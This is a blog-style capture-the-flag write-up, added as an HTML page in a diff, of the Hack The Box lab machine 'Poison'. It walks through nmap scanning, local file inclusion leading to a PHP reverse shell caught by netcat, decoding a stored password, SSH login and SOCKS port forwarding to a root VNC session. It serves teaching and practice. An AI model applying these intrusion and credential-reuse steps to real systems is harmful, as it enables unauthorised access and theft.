@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Hack The Box - Poison - DiegoExploit
+        
+    </title>
+    <style>
+  #carbonads {
+    border: 1px solid black;
+    border-radius: 7px;
+    border-spacing: 7px;
+    display: block;
+    overflow: hidden;
+    padding: 1em;
+    line-height: 1.5;
+  }
+  #carbonads span {
+    position: relative;
+    display: block;
+    overflow: hidden;
+  }
+  .carbon-img {
+    float: left;
+    margin-right: 1em;
+  }
+  .carbon-img img {
+    display: block;
+  }
+  .carbon-text {
+    display: block;
+    float: left;
+    max-width: calc(100% - 130px - 1em);
+    text-align: left;
+  }
+  .carbon-poweredby {
+    position: absolute;
+    left: 142px;
+    bottom: 0;
+    display: block;
+    font-size: .8em;
+    line-height: 1;
+    letter-spacing: 1px;
+    }
+    </style>
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-P385GSF');</script>
+<!-- End Google Tag Manager -->
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P385GSF"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+    <style>
+      #htbbadge{
+        float: left;
+      }
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="DiegoExploit" type="application/rss+xml">
+</head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>DiegoExploit</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+</ul>
+<h1 id="Categories Windows"><a href="#Categories Windows" class="headerlink" title="Categories Windows"></a>Categories Windows</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/legacy/">1. Hack The Box - Legacy</a></li>
+<li><a href="/hack-the-box/devel/">2. Hack The Box - Devel</a></li>
+<li><a href="/hack-the-box/optimum/">3. Hack The Box - Optimum</a></li>
+<li><a href="/hack-the-box/bastard/">4. Hack The Box - Bastard</a></li>
+<li><a href="/hack-the-box/artic/">5. Hack The Box - Artic</a></li>
+<li><a href="/hack-the-box/grandpa/">6. Hack The Box - Grandpa</a></li>
+<li><a href="/hack-the-box/granny/">7. Hack The Box - Granny</a></li>
+<li><a href="/hack-the-box/blue/">8. Hack The Box - Blue</a></li>
+<li><a href="/hack-the-box/silo/">9. Hack The Box - Silo</a></li>
+<li><a href="/hack-the-box/bounty/">10. Hack The Box - Bounty</a></li>
+<li><a href="/hack-the-box/jerry/">11. Hack The Box - Jerry</a></li>
+<li><a href="/hack-the-box/conceal/">12. Hack The Box - Conceal</a></li>
+<li><a href="/hack-the-box/chatterbox/">13. Hack The Box - Chatterbox</a></li>
+<li><a href="/hack-the-box/forest/">14. Hack The Box - Forest</a></li>
+<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
+<li><a href="/hack-the-box/secnotes/">16. Hack The Box - Secnotes</a></li>
+<li><a href="/hack-the-box/bastion/">17. Hack The Box - Bastion</a></li>
+
+</ul>
+<h1 id="Categories Linux"><a href="#Categories Linux" class="headerlink" title="Categories Linux"></a>Categories Linux</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/lame/">1. Hack The Box - Lame</a></li>
+<li><a href="/hack-the-box/popcorn/">2. Hack The Box - Popcorn</a></li>
+<li><a href="/hack-the-box/beep/">3. Hack The Box - Beep</a></li>
+<li><a href="/hack-the-box/tenten/">4. Hack The Box - Tenten</a></li>
+<li><a href="/hack-the-box/cronos/">5. Hack The Box - Cronos</a></li>
+<li><a href="/hack-the-box/brainfuck/">6. Hack The Box - brainfuck</a></li>
+<li><a href="/hack-the-box/shocker/">6. Hack The Box - Shocker</a></li>
+<li><a href="/hack-the-box/bashed/">7. Hack The Box - Bashed</a></li>
+<li><a href="/hack-the-box/nibbles/">8. Hack The Box - Nibbles</a></li>
+<li><a href="/hack-the-box/nineveh/">9. Hack The Box - Nineveh</a></li>
+<li><a href="/hack-the-box/sense/">10. Hack The Box - Sense</a></li>
+<li><a href="/hack-the-box/solidstate/">11. Hack The Box - SolidState</a></li>
+<li><a href="/hack-the-box/kotarak/">12. Hack The Box - Kotarak</a></li>
+<li><a href="/hack-the-box/node/">13. Hack The Box - Node</a></li>
+<li><a href="/hack-the-box/valentine/">14. Hack The Box - Valentine</a></li>
+<li><a href="/hack-the-box/poison/">15. Hack The Box - Poison</a></li>
+<li><a href="/hack-the-box/sunday/">16. Hack The Box - Sunday</a></li>
+<li><a href="/hack-the-box/tartasauce/">17. Hack The Box - Tartasauce</a></li>
+<li><a href="/hack-the-box/friendzone/">18. Hack The Box - Friendzone</a></li>
+<li><a href="/hack-the-box/swagshop/">19. HTB- SwagShop</a></li>
+<li><a href="/hack-the-box/jarvis/">20. Hack The Box Jarvis</a></li>
+</ul>
+
+
+
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <br>
+  <h1 id="Hack-The-Box-Poison"><a href="#Hack-The-Box-Poison" class="headerlink" title="Hack The Box - Poison"></a>Hack The Box - Poison</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Poison is a fairly easy machine which focuses mainly on log poisoning and port forwarding/tunneling. The machine is running FreeBSD which presents a few challenges for novice users as many common binaries from other distros are not available. Its IP address is <code>10.10.10.84</code> Let’s go to hack!!!<br><img src="/images/hackthebox/exploit/poison/0.png" alt=""></p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2>
+<p>As always we will start with <code>nmap</code> to scan for open ports and services:
+
+<pre><figure class="highlight plain">  |-------(root@kali)-------|(~/HackTheBox/poison)
+ |
+ |-->{SFire129}#nmap -p 22,80 -sC -sV -oA posion2 --script vuln --stylesheet nmap-bootstrap.xsl 10.10.10.84
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 16:04 EDT
+ Nmap scan report for 10.10.10.84                                                                                                                                            
+ Host is up (0.13s latency).
+ PORT   STATE SERVICE VERSION                                                                                                                                                
+ 22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)                                                                                                           
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)                                                                                                             
+ | vulners:                                                                                                                                                                  
+ |   cpe:/a:openbsd:openssh:7.2:
+ |       CVE-2016-8858   7.8     https://vulners.com/cve/CVE-2016-8858
+ |       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919
+ |       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906
+ |_      CVE-2016-10708  5.0     https://vulners.com/cve/CVE-2016-10708
+ 80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
+ |_clamav-exec: ERROR: Script execution failed (use -d to debug)
+ | http-csrf:
+ | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.84
+ |   Found the following possible CSRF vulnerabilities:
+ |
+ |     Path: http://10.10.10.84:80/
+ |     Form id:
+ |_    Form action: /browse.php
+ |_http-dombased-xss: Couldn't find any DOM based XSS.
+ | http-enum:
+ |   /info.php: Possible information file
+ |_  /phpinfo.php: Possible information file
+ |_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
+ | http-sql-injection:
+ |   Possible sqli for forms:
+ |     Form at path: /, form's action: /browse.php. Fields that might be vulnerable:
+ |_      file
+ |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+ |_http-trace: TRACE is enabled
+ |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
+ | vulners:
+ |   cpe:/a:apache:http_server:2.4.29:
+ |       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211
+ |       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
+ |       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
+ |       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082
+ |       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
+ |       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
+ |       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
+ |       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
+ |       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081
+ |       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
+ |       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196
+ |       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
+ |       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333
+ |       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
+ |       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197
+ |       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
+ |       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763
+ |_      CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
+ Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
+ 
+ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 87.35 seconds</figure></pre>
+ <p>In this case was used the stylesheet called <code>nmap-bootstrap.xml</code>, which allow to view in a web  page the output.
+  <img src="/images/hackthebox/exploit/poison/19.png" alt=""></p>
+  <p>The output show two ports open 80 and 22, but the nmap scan reveal some directories.
+  <img src="/images/hackthebox/exploit/poison/1.png" alt=""></p>
+ <p>File info.php
+ <img src="/images/hackthebox/exploit/poison/2.png" alt=""></p>
+ <p>File phpinfo.php.
+ <img src="/images/hackthebox/exploit/poison/3.png" alt=""></p>
+ <p>File listfile.php in source code.
+ <img src="/images/hackthebox/exploit/poison/4.png" alt=""></p>
+ <p>File browse.php
+ <img src="/images/hackthebox/exploit/poison/5.png" alt=""></p>
+ <h2 id="Enumeration"><a href="#Enumeration" class="Enumeration" title="Enumeration"></a>Enumeration</h2>
+ <p>Intercepting traffic with Burpsuite tool and testing the Local File inclusion vulnerability show the passwd file from server.
+ <img src="/images/hackthebox/exploit/poison/6.png" alt=""></p>
+ <p>Clone repository <code>PayloadAllTheThings</code> and search the file <code>phpinfolfi.py</code>.
+ <img src="/images/hackthebox/exploit/poison/7.png" alt=""></p>
+ <p>Copy the code from <code>php-reverse.php</code> and paste into the <code>phpinfolfi.py</code>. Remember change the IP address with own.
+ <img src="/images/hackthebox/exploit/poison/9.png" alt=""></p>
+ <p>Change the file with vulnerability local file inclusion, in this case <code>browse.php</code>
+ <img src="/images/hackthebox/exploit/poison/8.png" alt=""></p>
+ <h2 id="Exploit"><a href="#Exploit" class="Exploit" title="Exploit"></a>Exploit</h2>
+ <p>Run the netcat listener and launch the <code>phpinfolfi.py</code>.
+ <img src="/images/hackthebox/exploit/poison/10.png" alt=""></p>
+ <p>The output reveal an error on <code>tcp_name</code> section, locate and change with <code>gt</code> letters in the whole code.
+ <img src="/images/hackthebox/exploit/poison/20.png" alt=""></p>
+ <p>Run again the code.
+ <img src="/images/hackthebox/exploit/poison/11.png" alt=""></p>
+ <p>We have a reverse connection over netcat listener. 
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/poison)
+ |
+ |-->{SFire129}#nc -nvlp 4446
+ listening on [any] 4446 ...
+ 
+ connect to [10.10.14.45] from (UNKNOWN) [10.10.10.84] 40680
+ FreeBSD Poison 11.1-RELEASE FreeBSD 11.1-RELEASE #0 r321309: Fri Jul 21 02:08:28 UTC 2017     root@releng2.nyi.freebsd.org:/usr/obj/usr/src/sys/GENERIC  amd64
+  2:13AM  up 14:14, 0 users, load averages: 0.42, 0.31, 0.22
+ USER       TTY      FROM                                      LOGIN@  IDLE WHAT
+ uid=80(www) gid=80(www) groups=80(www)
+ sh: can't access tty; job control turned off</figure></pre>
+ <p>The session no has root privileges.
+  <pre><figure class="highlight plain"> $ cd /home
+ $ ls
+ charix
+ $ cd charix
+ cd: charix: Permission denied
+ $ ls
+ charix
+ $</figure></pre>
+ <p>Enumerate the system into the each one folders.
+   <pre><figure class="highlight plain"> $ cd /usr/local
+ $ ls
+ bin
+ etc
+ include
+ info
+ lib
+ libdata
+ libexec
+ llvm50
+ man
+ openssl
+ sbin
+ share
+ var
+ www
+ $ cd www
+ $ ls
+ apache24
+ $ cd apache24
+ $ ls
+ cgi-bin
+ data
+ error
+ icons
+ $ cd data
+ $ ls
+ browse.php
+ index.php
+ info.php
+ ini.php
+ listfiles.php
+ phpinfo.php
+ pwdbackup.txt </figure></pre>
+ <p>The file <code>pwdbackup.txt</code> show a code encrypted 13 times with base64.
+  <img src="/images/hackthebox/exploit/poison/12.png" alt=""></p>
+ <p>Copy the code and decrypted.
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/poison)
+ |
+ |-->{SFire129}#cat code | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d
+ Charix!2#4%6&8(0|-------(root@kali)-------|(~/HackTheBox/poison)
+ |
+ |-->{SFire129}#</figure></pre> 
+ <p>Connect by ssh with the password found.
+ <img src="/images/hackthebox/exploit/poison/14.png" alt=""></p>
+ <p>In the current directory there is a file <code>secret.zip</code>, download from server.
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/poison)
+ |
+ |-->{SFire129}#scp charix@10.10.10.84:secret.zip .
+ Password for charix@Poison:
+ secret.zip                                                                                                                                100%  166     1.6KB/s   00:00
+ |-------(root@kali)-------|(~/HackTheBox/poison)
+ |
+ |-->{SFire129}#unzip secret.zip
+ Archive:  secret.zip
+ [secret.zip] secret password:
+  extracting: secret </figure></pre>
+  <p>Enumerate the system, show software as VNC.
+   <img src="/images/hackthebox/exploit/poison/15.png" alt=""></p>
+  <p>The Vnc is a local service, the <code>sockstat -4l</code> show the <code>127.0.0.1:5901 and 127.0.0.1:5801</code>.
+   <img src="/images/hackthebox/exploit/poison/13.png" alt=""></p>
+  <h2 id="Port-Forwarding"><a href="#Port-Forwarding" class="Port-Forwarding" title="Port-Forwarding"></a>Port-Forwarding</h2>
+  <p>The SSH protocol is the best way for Port-Forwarding, in the current session SSH press <code>~C</code> for entry in the ssh mode and then type <code>-D 1080</code>.
+  <img src="/images/hackthebox/exploit/poison/16.png" alt=""></p>
+  <p>In the Kali linux, run <code>netstat -punta</code> command for review connections and reveal the port 1080 for <code>port forwarding</code>.
+  <img src="/images/hackthebox/exploit/poison/17.png" alt=""></p>
+  <h2 id="Capture-The-Flag"><a href="#Capture-The-Flag" class="Capture-The-Flag" title="Capture-The-Flag"></a>Capture The Flag</h2>
+  <p>Run the next commando for vnc viewer.
+<pre><figure class="highlight plain">  |-------(root@kali)-------|(~/HackTheBox/poison)
+ |                                                                                                                                                                     
+ |-->{SFire129}#proxychains vncviewer -passwd secret 127.0.0.1::5901                                                                                                  
+ ProxyChains-3.1 (http://proxychains.sf.net)
+ |D-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:5901-<><>-OK
+ Connected to RFB server, using protocol version 3.8
+ Enabling TightVNC protocol extensions
+ Performing standard VNC authentication
+ Authentication successful
+ Desktop name "root's X desktop (Poison:1)"
+ VNC server default format:
+   32 bits per pixel.
+   Least significant byte first in each pixel.
+   True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
+ Using default colormap which is TrueColor.  Pixel format:
+   32 bits per pixel.
+   Least significant byte first in each pixel.
+   True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
+ Same machine: preferring raw encoding</figure></pre>
+  <p>A pop-up show the vnc with root privileges.
+ <img src="/images/hackthebox/exploit/poison/18.png" alt=""></p>
+<p> And we owned root !</p>
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avatar.png" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>DiegoExploit</div>
+      <div>2020-06-23</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>
+
+      <a class="tag-link" href="/tags/linux/" rel="tag">#FreeBSD</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#POrt-Forwarding</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#VNCViewer</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
